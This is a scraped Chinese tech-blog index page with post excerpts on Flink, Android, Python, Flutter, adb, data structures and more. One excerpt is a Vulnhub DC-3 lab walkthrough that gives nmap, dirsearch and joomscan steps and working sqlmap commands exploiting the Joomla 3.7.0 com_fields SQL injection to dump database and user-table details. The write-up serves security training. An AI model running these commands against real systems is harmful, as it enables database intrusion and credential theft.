与此同时，硬件的提升也带来的存储模式的变化，最显著的是网络带宽从 10 年前几百 Mbps，到现在 25Gbps 起步，基本上可以和本地 SSD 的宽度比肩，且内网传输的话速度快、成本低，这使得存储模式从本地存储，到分布式存储，再向云存储的转变。云存储虽然延迟高，但具有容量大、成本低的优势，非常契合现在降本增效的大背景。
另外作业负载方面也发生了很大变化，Flink 刚诞生时，几百 MB 的状态就算大状态场景了，而现在物流等一些场景下，几百 TB 的状态也是很常见的。技术的进步、用户需求的变化带给我们对状态存储这个部分的一些新的思考，这就有了本文要探讨的话题。
本文内容主要分为三个方面探讨一下 Flink 存算分离架构的演进方向。
第一部分，先讲为什么状态对 Flink 的重要性，因为状态访问在单条数据处理路径上，处理延迟对整体性能影响很大；
第二部分，会讲一讲近期状态存储这个部分社区以及我们在阿里内部所做的一些工作和探索；
第三部分，聊一聊基于这些探索工作，Flink 存算分离架构应该是什么样的。
2. 为什么状态对 Flink 如此重要 2.1 状态的角色 在 Flink 流处理中，如果后续计算需要依赖前面输入的时候，需要用状态表（State Table）来保存中间数据。在 Task Manager 中，通过一个称为 StateBackend 的服务组件为算子层提供状态读写服务。如果状态太大，内存无法承载时，StateBackend 会把状态数据以文件的形式组织并存储在本地磁盘上。但是通常本地盘不具备数据可靠性，所以 Flink 需要对状态进行定期的快照，把本地文件上传到分布式文件系统（OSS/HDFS/S3 等）。另外，一个 Flink 作业中往往有多个Task 包含有状态算子，因此 Flink 需要确保这些不同的 Task 上的状态快照是全局一致的，也就是说是对齐输入的，这个过程就是 Flink Checkpointing 过程。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d19d3a0a5ff4856df223046c4a644b72/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ff12bf867d8804d8e8ed79197e7204e/" rel="bookmark">
			Vulnhub靶场DC-3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本机192.168.223.128
靶机192.168.223.139
目标发现nmap -sP 192.168.223.0/24
端口扫描nmap -p- 192.168.223.139
之开启了一个80端口
看一下是什么服务
nmap -sV -p- -A 192.168.223.139 是一个apache服务，joomla模板
看一下web
没什么有用信息。
扫描一下后台
dirsearch -u http://192.168.223.139/ 有个administator可能是后台界面
看一下
joomla这个cms有个专门漏扫工具
joomscan --help
扫一下
没扫出来什么有用的信息
比较重要的就是这个版本3.7.0，搜一下看看有没有漏洞
看一下这个php文件
把里面的url改成目标机ip
不太管用，换个txt文件看看怎么个回事
看看这42033.txt，版本号完全一致
给了sqlmap的指令，把其中的url改一下
sqlmap -u "http://192.168.223.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --current-db -p list[fullordering] 爆出库名了
看一下当前库名
当前是joomladb
看一下表明
sqlmap -u "http://192.168.223.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --tables -D joomladb -p list[fullordering] 巨长的表，一般看users
sqlmap -u "http://192.168.223.139/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -T "#__users" -D joomladb -p list[fullordering] --columns 注意给表名加上双引号不然会被当成注释
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3ff12bf867d8804d8e8ed79197e7204e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/437935ab169b7097c4cf6a4ee8bfa4e2/" rel="bookmark">
			jquery多选框，上篇文章后续
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;!-- &lt;meta charset="GBK"&gt; --&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;form&gt; &lt;body&gt; &lt;table id="myTable"&gt; &lt;tr&gt; &lt;td&gt;黄1&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;行2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;行3&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/form&gt; &lt;button id="button"&gt;点击我&lt;/button&gt; &lt;!-- &lt;button id="button" onclick="submit"&gt;点击我&lt;/button&gt; --&gt; &lt;/html&gt; &lt;script src="https://code.jquery.com/jquery-3.6.0.min.js"&gt;&lt;/script&gt; &lt;script&gt; $(document).ready(function() { debugger // 获取表格的所有行 //var rows = $('#myTable tr'); //$(rows).append('&lt;input type="checkbox" /&gt;'); // 1、getJSON方法请求数据 // $.getJSON("date.json", "", function(response) { // console.log(response) // debugger // //	var rows = $('#myTable tr'); // var rows = $('#myTable tr:eq(0)'); // var name = $('#myTable tr:eq(0) td').
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/437935ab169b7097c4cf6a4ee8bfa4e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9359874bf6e24f9e6999dc2cfbea9767/" rel="bookmark">
			setbackgrounddrawable过时的代替方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【问题】
如下android代码：
Drawable statusQuestionDrawable = resources.getDrawable(R.drawable.status_question); statusView.setBackgroundDrawable(statusQuestionDrawable); 结果提示：
The method setBackgroundDrawable(Drawable) from the type View is deprecated
【解决过程】
1.很明显是该函数被废弃了。
但是换成啥，目前不知道。
2.参考：
The method setBackgroundDrawable(Drawable) from the type View is deprecated求解-CSDN论坛-CSDN.NET-中国最大的IT技术社区
改为：
&lt;span style="color:#008080"&gt;statusView.setBackground(resources.getDrawable(R.drawable.status_question));&lt;/span&gt; 结果却又提示：
Call requires API level 16 (current min is 14): android.widget.TextView#setBackground
3.再改为：
&lt;span style="color:#008080"&gt;statusView.setBackgroundResource(R.drawable.status_question);&lt;/span&gt; 就可以了：
4.后来看到：
eclipse – Android – set layout background programmatically – Stack Overflow
android – Deprecated method, but replacing method requires higher api – Stack Overflow
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9359874bf6e24f9e6999dc2cfbea9767/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21bc369889c64a203352fb8e4218f485/" rel="bookmark">
			drawCircle方法：绘制圆形
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		drawCircle方法：绘制圆形
【功能说明】该方法用于在画布上绘制圆形，通过指定圆形圆心的坐标和半径来实现。该方法是绘制圆形的主要方法，同时也可以通过设置画笔的空心效果来绘制空心的圆形。
【基本语法】public void drawCircle (float cx, float cy, float radius, Paint paint)
参数说明
cx：圆心的x坐标。
cy：圆心的y坐标。
radius：圆的半径。
paint：绘制时所使用的画笔。
【实例演示】下面通过代码来演示如何在画布上绘制圆形。
protected void onDraw(Canvas canvas) { // TODO Auto-generated method stub super.onDraw(canvas); paint.setAntiAlias(true); //设置画笔为无锯齿 paint.setColor(Color.BLACK); //设置画笔颜色 canvas.drawColor(Color.WHITE); //白色背景 paint.setStrokeWidth((float) 3.0); //线宽 paint.setStyle(Style.STROKE); //空心效果 canvas.drawCircle(50, 50, 10, paint); //绘制圆形 canvas.drawCircle(100, 100, 20, paint); //绘制圆形 canvas.drawCircle(150, 150, 30, paint); //绘制圆形 canvas.drawCircle(200, 200, 40, paint); //绘制圆形 canvas.drawCircle(250, 250, 50, paint); //绘制圆形 canvas.drawCircle(300, 300, 60, paint); //绘制圆形 canvas.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21bc369889c64a203352fb8e4218f485/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0fd42e6698fe8095995d70a79247aa8/" rel="bookmark">
			袁庭新老师一套教程帮你搞定Linux操作系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		袁老师出品了一套《Linux操作系统》教程，它是一套全面、系统的Linux学习与实战课程，从零基础入门到精通，引领学员掌握Linux操作系统的核心知识与实践技能。本课程注重实用性和实战性，让学员在实践中掌握Linux系统运维的精髓。
1.教学大纲 袁老师的这套《Linux操作系统》教程，以实操为主通俗易懂。一套教程帮你搞定Linux操作系统的基本使用。
主要核心内容包括：Linux系统概述、虚拟机安装及介绍、Linux系统目录结构、远程连接CentOS、XShell安装和连接CentOS、Linux常用命令、权限管理、进程管理和其他命令、vi和vim工具使用、配置静态IP、JDK的下载与安装、Tomcat安装、MySQL下载安装、MySQL配置等。
2.学习目标 本套《Linux操作系统》教程的学习目标：
了解什么是Linux操作系统熟练掌握Linux操作系统环境安装和搭建熟练使用Linux的基本命令独立完成项目的打包和部署 本教程针对的是Linux服务器方面的知识，适合从事运维或后端开发的人员阅读和学习。
3.Linux系统概述 Linux 内核最初只是由芬兰人林纳斯·托瓦兹（Linus Torvalds）在赫尔辛基大学上学时出于个人爱好而设计和研发的。Linux系统诞生于1991年。
Linux系统是一套免费、自由、开放源代码的类Unix操作系统，是一个基于Posix（Portable Operating System Interface）和Unix的多用户、多任务、支持多线程和多CPU的操作系统。
Linux能运行主要的Unix工具软件、应用程序和网络协议，支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。
今天的内容就分享到这里吧。关注「袁庭新」，干货天天都不断！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acf5c38d0a7d8fd1faa9e7fc403cd7bd/" rel="bookmark">
			python和java的本质区别,python和java有什么关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 大家好，小编为大家解答python和java的本质区别的问题。很多人还不知道python和java有什么关系，现在让我们一起来看看吧！
Python vs. Java: 深入比较两者的差异与特点
引言：
Python和Java是两种广泛应用于软件开发的编程语言，它们在语法、应用领域和性能方面存在着显著差异。本文将深入比较Python和Java之间的区别，探讨它们的优缺点以及适用场景，帮助读者更好地理解和选择适合自己的编程语言用python画简单笑脸代码。
一、语法比较
Python是一种动态、解释型的编程语言，强调代码的可读性和简洁性。它使用缩进来表示代码块，没有强制的分号结尾，并采用面向对象的编程风格。下面是一个使用Python编写的简单的Hello World程序：
print("Hello, World!") Java是一种静态、编译型的编程语言，注重类型安全和强制性的代码结构。它使用大括号表示代码块，每条语句都需要以分号结尾，并采用面向对象的编程范式。下面是一个使用Java编写的Hello World程序：
public class HelloWorld { public 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15d0a3b0509972c7f17d79357ed99007/" rel="bookmark">
			python编程案列教程,python编程简单案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，小编来为大家解答以下问题，python编程案列教程，python编程简单案例，现在让我们一起来看看吧！
Source code download: 本文相关源码
前言 Python 是一种面向对象、解释型、弱类型的脚本语言，它也是一种功能强大而完善的通用型语言。
相比其他编程语言（比如 Java）,Python 代码非常简单，上手非常容易Python中使用Turtle绘制半圆形。比如我们要完成某个功能，如果用 Java 需要 100 行代码，但用 Python 可能只需要 20 行代码，这是 Python 具有巨大吸引力的一大特点。
Python 的两大特色是清晰的语法和可扩展性：
Python 的语法非常清晰，它甚至不是一种格式自由的语言。例如，它要求 if 语句的下一行必须向右缩进，否则不能通过编译。Python的可扩展性体现为它的模块，Python 具有脚本语言中最丰富和强大的类库（这些类库被形象地称为“batteries included，内置电池”），这些类库覆盖了文件 I/O、GUI、网络编程、数据库访问、文本操作等绝大部分应用场景。 此外，Python 的社区也很发达，即使一些小众的应用场景，Python 往往也有对应的开源模块来提供解决方案。
Python 作为一门解释型的语言，它天生具有跨平台的特征，只要为平台提供了相应的 Python 解释器，Python 就可以在该平台上运行。（解释型语言几乎天然是跨平台的。）
那Python这么火爆，几乎可以说是人人都要学Python，但是学是一回事，用又是另一回事了。理论终将是纸上谈兵，是骡子是马得拉出来溜溜。为了帮助大家更快的掌握Python，我给大家准备了10个Python经典项目实战，附带源码等。快来看看吧
1.Python Hello World 实例 &lt;span style="color:#000000"&gt;&lt;span style="background-color:#282c34"&gt;&lt;code class="language-python"&gt;&lt;span style="color:#5c6370"&gt;# -*- coding: UTF-8 -*- &lt;/span&gt; &lt;span style="color:#5c6370"&gt;# Filename : helloworld.py &lt;/span&gt; &lt;span style="color:#5c6370"&gt;# author by : www.runoob.com &lt;/span&gt; &lt;span style="color:#5c6370"&gt;# 该实例输出 Hello World!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15d0a3b0509972c7f17d79357ed99007/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b65ded4a609e1bbfeb890efe9e50f1f/" rel="bookmark">
			大一python编程题库和答案,大一python程序设计考题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，本文将围绕大一python基础编程题答案展开说明，大一python基础编程题列表是一个很多人都想弄明白的事情，想搞清楚大一python编程题库和答案需要先了解以下几个事情。
Source code download: 本文相关源码
大家好，本文将围绕大学python题库及答案解析展开说明，python期末编程题及答案是一个很多人都想弄明白的事情，想搞清楚大学生python期末解答题需要先了解以下几个事情。
一、单项选择题（每题 2 分，共 20 分） 1. 以下关于计算机和程序设计的说法错误的是（ ）pythonturtle绘制树。
A. 高级编程语言按照计算机执行方式可分为静态语言和脚本语言
B. 编译是将源代码转换成目标代码的过程
C. IPO 方法是一种按输入数据、处理数据和输出数据的程序运算模式
D. Python 3.x 能够向下兼容 2.x 系列程序
2. 下面不符合 Python 语言命名规则的变量名是（ ）用python画笑脸代码。
A. monthly B. monthly3 C. 3monthly D. _Monthly3_
3.下列表达式值为 True 的是（ ）。
A. 5+4j &gt; 2-3j B. 3 &gt; 2 &gt; 2 C. 1 == 1 and 2 != 1 D. not(1==1and 0!=1)
4. 表达式 eval('500/10')的结果是（ ）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b65ded4a609e1bbfeb890efe9e50f1f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae90c2b2ba8ecba6de4b2dab1ed7a408/" rel="bookmark">
			# 超新星小白勇闯github -ssh
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		超新星小白
超新星小白勇闯github -ssh 作为一枚超新星编程小白，在使用github时发生了许多小插曲。
今天分享一下如何设置ssh key
设置好了之后就可以将github上的代码包直接使用"ssh git xxx"命令远程下载在本地了哦！！
centos8 生产环境
生成本地SSH key [root@s_182 ~]# cd ~/.ssh [root@s_182 .ssh]# ls authorized_keys id_rsa id_rsa.pub known_hosts [root@s_182 .ssh]# cat id_rsa.pub ssh-rsa AAAAB3....(省略)....c= root@s_182 将id_rsa.pub上所有的内容复制粘贴到github上
执行
[root@s_182 ~]# ssh -vT git@github.com 插曲来了！！！出现问题了
[root@s_182 ~]# ssh -vT git@github.com OpenSSH_8.0p1, OpenSSL 1.1.1k FIPS 25 Mar 2021 debug1: Reading configuration data /etc/ssh/ssh_config debug1: Reading configuration data /etc/ssh/ssh_config.d/05-redhat.conf debug1: Reading configuration data /etc/crypto-policies/back-ends/openssh.config debug1: configuration requests final Match pass debug1: re-parsing configuration debug1: Reading configuration data /etc/ssh/ssh_config debug1: Reading configuration data /etc/ssh/ssh_config.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae90c2b2ba8ecba6de4b2dab1ed7a408/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e752168f78c2c324a029133374a91e91/" rel="bookmark">
			Mac&#43;Android Studio配置 Flutter环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Fluttrer中文下载官网
Flutter下载官网
1、环境变量 .zshrc
#Flutter export PUB_HOSTED_URL="https://pub.flutter-io.cn" export FLUTTER_STORAGE_BASE_URL="https://storage.flutter-io.cn" export FLUTTER_HOME=/Users/leon/Flutter/flutter_3_10_4/flutter export PATH=$FLUTTER_HOME/bin 2、Android项目 （1）android/build.gradle android/build.gradle
maven { url 'https://maven.aliyun.com/repository/google' } maven { url 'https://maven.aliyun.com/repository/jcenter' } maven { url 'http://maven.aliyun.com/nexus/content/groups/public' } （2）Gradle android/gradle/wrapper/gradle-wrapper.properties
（3）AGP android/build.gradle
（4）设置 Flutter 和 Dart Flutter Sdk Dart Sdk 3、配置 Flutter Sdk （1）flutter\packages\flutter_tools\gradle\flutter.gradle maven { url 'https://maven.aliyun.com/repository/google' } maven { url 'https://maven.aliyun.com/repository/jcenter' } maven { url 'http://maven.aliyun.com/nexus/content/groups/public' } （2）flutter\packages\flutter_tools\gradle\resolve_dependencies.gradle maven { url 'https://maven.aliyun.com/repository/google' } maven { url 'https://maven.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e752168f78c2c324a029133374a91e91/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c54ce05f63a44b1262b4012d07561ed1/" rel="bookmark">
			鸿蒙：@Prop装饰器-父子单向同步
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​​​​​​ @Prop装饰的变量可以和父组件建立单向的同步关系。@Prop装饰的变量是可变的，但是变化不会同步回其父组件。从API version 9开始，该装饰器支持在ArkTS卡片中使用。
一、概述 @Prop装饰的变量和父组件建立单向的同步关系：
@Prop变量允许在本地修改，但修改后的变化不会同步回父组件。当父组件中的数据源更改时，与之相关的@Prop装饰的变量都会自动更新。如果子组件已经在本地修改了@Prop装饰的相关变量值，而在父组件中对应的@State装饰的变量被修改后，子组件本地修改的@Prop装饰的相关变量值将被覆盖。 二、限制条件 @Prop修饰复杂类型时是深拷贝，在拷贝的过程中除了基本类型、Map、Set、Date、Array外，都会丢失类型。@Prop装饰器不能在@Entry装饰的自定义组件中使用。 装饰器使用规则说明 @Prop变量装饰器
说明
装饰器参数
无
同步类型
单向同步：对父组件状态变量值的修改，将同步给子组件@Prop装饰的变量，子组件@Prop变量的修改不会同步到父组件的状态变量上
允许装饰的变量类型
string、number、boolean、enum类型。
不支持any，不允许使用undefined和null。
必须指定类型。
在父组件中，传递给@Prop装饰的值不能为undefined或者null，反例如下所示。
CompA ({ aProp: undefined })
CompA ({ aProp: null })
@Prop和数据源类型需要相同，有以下三种情况（数据源以@State为例）：
@Prop装饰的变量和父组件状态变量类型相同，即@Prop : S和@State : S；当父组件的状态变量为数组时，@Prop装饰的变量和父组件状态变量的数组项类型相同，即@Prop : S和@State : Array&lt;S&gt;；当父组件状态变量为Object或者class时，@Prop装饰的变量和父组件状态变量的属性类型相同，即@Prop : S和@State : { propA: S }。 被装饰变量的初始值
允许本地初始化。
4.变量的传递/访问规则说明 传递/访问
说明
从父组件初始化
如果本地有初始化，则是可选的。没有的话，则必选，支持父组件中的常规变量、@State、@Link、@Prop、@Provide、@Consume、@ObjectLink、@StorageLink、@StorageProp、@LocalStorageLink和@LocalStorageProp去初始化子组件中的@Prop变量。
用于初始化子组件
@Prop支持去初始化子组件中的常规变量、@State、@Link、@Prop、@Provide。
是否支持组件外访问
@Prop装饰的变量是私有的，只能在组件内访问。
初始化规则图示：
5.观察变化和行为表现 （1）观察变化 @Prop装饰的数据可以观察到以下变化：
当装饰的类型是允许的类型，即string、number、boolean、enum类型都可以观察到的赋值变化； // 简单类型
@Prop count: number;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c54ce05f63a44b1262b4012d07561ed1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4f98e9499f93232a8bd2d4dcaf479d7/" rel="bookmark">
			基于yolo进行目标检测的实验和研究
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		根据我接触到的项目经验来看，需要我们进行检测的不是自然场景下的任意物体，而是特定场景下一类物体。典型的就是钢管识别，这些照片一般都是在厂区里面拍的、是对着钢管拍的，拍摄的目的是识别出钢管的数量。这里就为YOLO一类目标检测技术提供了空间，通过基于自定义数据集的迁移学习，能够实现一些效果，这里将相关东西整理出来。
基础环境：
标注工具分为本机标注和网络智能标注。LabelImg能够提供不错的操作体验，在windows上我只找到一个老版本的，能够生成voc的数据格式；在linux上的最新版本可以直接生成yolo的格式。
easydate能够提供只能标注，简单来说就是你只需要标注几张图片（不同数据数量不同），它可以先训练一个小模型，辅助你继续进行标注。
这个的价值肯定是不言而喻的。在标注这块，我还编码实现了基于传统算法的标签生成工具。具体来说，就是基于传统算法，生成初略的数据集，将这里的结果作为标签导入模型训练中去。
多措并举，能够有效提高数据标注速度。当然，标注仍然是一个痛苦的过程。
在训练这块，我使用了基于Kaggle的yolo官方notebook（https://www.kaggle.com/code/jsxyhelu2019/yolov5），进行一些删改后使用。这样能够有效使用免费的GPU，而且相对来说也比较方便。
实验一：筷子识别
第一个例子使用了网络上找到的数据集“筷子识别”，他最大的优势就是提供了完整的数据集。
**1、图片的采集，**可以看到这里的数据是比较集中的、质量是比较高的。数量大概210左右。
**2、labelimg标注。**原作者提供了标注好的voc结果，可以直接使用，也可以拿过来自己体会一下。
**3、智能标注扩充。**生成3张图像，使用easydl进行智能进行扩充。注意这里如果无标注数据太少，智能标注会开启失败。
4、修正结果
**5、数据格式转换。**需要将voc格式转换成为yolo格式。注意这里的label和前面标注的label是一样的。
import os import xml.etree.ElementTree as ET classes = ["label"] # 将x1, y1, x2, y2转换成yolov5所需要的x, y, w, h格式 def xyxy2xywh(size, box): dw = 1. / size[0] dh = 1. / size[1] x = (box[0] + box[2]) / 2 * dw y = (box[1] + box[3]) / 2 * dh w = (box[2] - box[0]) * dw h = (box[3] - box[1]) * dh return (x, y, w, h) # 返回的都是标准化后的值 def voc2yolo(path): # 可以打印看看该路径是否正确 print(len(os.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a4f98e9499f93232a8bd2d4dcaf479d7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be1dfbee047266ff59ee3f7b1c3f3d82/" rel="bookmark">
			数据结构（绪论&#43;算法的基本概念）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、绪论1.1、数据结构的基本概念1.2、数据结构三要素1.2.1、逻辑结构1.2.2、数据的运算1.2.3、物理结构（存储结构）1.2.4、数据类型和抽象数据类型 二、算法的基本概念2.1、算法的特性2.2、“好”算法的特质2.2.1、算法时间复杂度2.2.2、算法空间复杂度 一、绪论 1.1、数据结构的基本概念 数据：数据是信息的载体，是描述客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合。数据是计算机程序加工的原料。
数据元素、数据项：数据元素是数据的基本单位，通常作为一个整体进行考虑和处理。一个数据元素可由若干数据项组成，数据项是构成数据元素的不可分割的最小单位。
数据对象是具有相同性质的数据元素的集合，是数据的一个子集
数据结构是相互之间存在一种或多种特定关系的数据元素的集合
1.2、数据结构三要素 1.2.1、逻辑结构 集合： 各个元素同属于一个集合，别无其他关系
线性结构： 数据元素之间是一对一的关系。除了第一个元素，所有元素都有唯一前驱；除了最后一个元素，所有元素都有唯一后继
树形结构： 数据元素之间是一对多的关系
图结构： 数据元素之间是多对多的关系
1.2.2、数据的运算 针对于某种逻辑结构，结合实际需求，定义基本运算
1.2.3、物理结构（存储结构） 线性结构：
顺序存储把逻辑上相邻的元素存储在物理位置上也相邻的存储单元中，元素之间的关系由存储单元的邻接关系来体现。
链式存储。逻辑上相邻的元素在物理位置上可以不相邻，借助指示元素存储地址的指针来表示元素之间的逻辑关系。
索引存储。在存储元素信息的同时，还建立附加的索引表。索引表中的每项称为索引项，索引项的一般形式是(关键字，地址)
散列存储。根据元素的关键字直接计算出该元素的存储地址，又称哈希(Hash）存储
若采用顺序存储，则各个数据元素在物理上必须是连续的；若采用非顺序存储，则各个数据元素在物理上可以是离散的。数据的存储结构会影响存储空间分配的方便程度数据的存储结构会影响对数据运算的速度 运算的定义是针对逻辑结构指出运算的功能的
运算的实现是针对存储结构的，指出运算的具体操作步骤。
1.2.4、数据类型和抽象数据类型 数据类型是一个值的集合和定义在此集合上的一组操作的总称。
1）原子类型。其值不可再分的数据类型。
2）结构类型。其值可以再分解为若干成分（分量）的数据类型。
抽象数据类型(Abstract Data Tvpe,ADT)是抽象数据组织及与之相关的操作。
二、算法的基本概念 2.1、算法的特性 程序=数据结构+算法
数据结构：如何用数据正确地描述现实世界的问题，并存入计算机
算法：如何高效的处理这些数据，以解决实际的问题
有穷性：一个算法必须总在执行有穷步之后结束，且每一步都可在有穷时间内完成。
确定性：算法中每条指令必须有确切的含义，对于相同的输入只能得出相同的输出。
可行性：算法中描述的操作都可以通过已经实现的基本运算执行有限次来实现。
输入：一个算法有零个或多个输入，这些输入取自于某个特定的对象的集合。
输出：一个算法有一个或多个输出，这些输出是与输入有着某种特定关系的量。
2.2、“好”算法的特质 正确性：算法应能够正确地解决求解问题。可读性：应具有良好的可读性，以帮助人们理解。健壮性：输入非法数据时，算法能适当地做出反应或进行处理，而不会产生莫名其妙的输出结果。高效率与低存储量需求
时间复杂度和空间复杂度 2.2.1、算法时间复杂度 事前预估算法时间开销T(n)与问题规模n的关系(T表示“time”)
时间复杂度，可以只保留阶数更高的部分
结论1：顺序执行的代码只会影响常数项，可以忽略
结论2：只需挑循环中的一个基本操作分析它的执行次数与n的关系即可
结论3：如果有多层嵌套循环，只需关注最深层循环循环了几次
小练习
计算上述算法的时间复杂度T(n)：
设最深层循环的语句频度(总共循环的次数）为x，则由循环条件可知，循环结束时刚好满足2x&gt;n
x=log2n+1
T(n)=O(x)=O(log2n) 把O（1）舍去了
2.2.2、算法空间复杂度 空间（space）
函数递归调用带来的内存开销
空间复杂度等于递归调用的深度
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc35b05d33f2b348a0817f205d7f5d76/" rel="bookmark">
			android开发者模式@adb无线调试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 adb调试功能介绍有线调试无线调试 配置无线adb调试手机端开发者选项配置电脑端配置步骤初次使用进行配对链接设备小结 检查链接是否成功 技巧快速打开无线调试 refs adb调试 功能介绍 ADB（Android Debug Bridge）是一种强大的命令行工具，它允许您与设备进行通信，将电脑上的指令发送到设备，并在设备上执行各种操作。： 有线调试 有线调试是通过 USB 连接电脑和 Android 设备的方式。这种方式的优点是连接稳定、速度快，适用于大量的数据传输，比如应用安装、调试等。在进行有线调试时，需要将 Android 设备连接到电脑，并在电脑上安装相应的 USB 驱动程序。 无线调试 无线调试是通过无线网络连接电脑和 Android 设备的方式。这种方式的优点是不需要物理连接线，更加方便灵活. 在手机端上可以利用shizuku等工具,在不需要电脑的情况下可以获得adb的功能和权限虽然需要链接到一个无线网络(WLAN),这个无线网络不需要能够链接互联网,也就是说如果有一台无线路由器或者备用手机(开热点),就可以进行无线调试 限制 在进行无线调试时，需要将 Android 设备和电脑连接到同一无线网络，并在电脑上运行 ADB 命令行工具。即wireless debugging,仅在Android11及其以上的版本才支持 配置无线adb调试 手机端开发者选项配置 必须和计算机(电脑)链接同一个局域网(一般链接同一个wifi即可,而且不可以是手机共享热点的这种形式,但这还是容易满足的) 下方是的实际操作和上述截图不是同一个时刻的,所以端口号看起来不一样 中间的一栏IP address &amp; Port是在执行adb connect的时候使用 电脑端配置步骤 初次使用进行配对 根据移动设备的ip:port进行配对adb pair &lt;ip:port&gt;
这个步骤相当于设备初次握手,通常只需要执行一次在今后的无线调试中只需要直接链接(connect)而不需要 再执行配对操作(如果网络环境变换,可能需要重新配对) PS C:\Users\cxxu&gt; adb pair 192.168.1.165:41363 Enter pairing code: 962532 * daemon not running; starting now at tcp:5037 * daemon started successfully Successfully paired to 192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc35b05d33f2b348a0817f205d7f5d76/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc20afb2b1b9f968607afc30b0b022a9/" rel="bookmark">
			Day36 435无重叠区间 763划分字母区间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		435 无重叠区间 给定一个区间的集合，找到需要移除区间的最小数量，使剩余区间互不重叠。
注意: 可以认为区间的终点总是大于它的起点。 区间 [1,2] 和 [2,3] 的边界相互“接触”，但没有相互重叠。
本题与上一题类似：
如果按照左边界排：
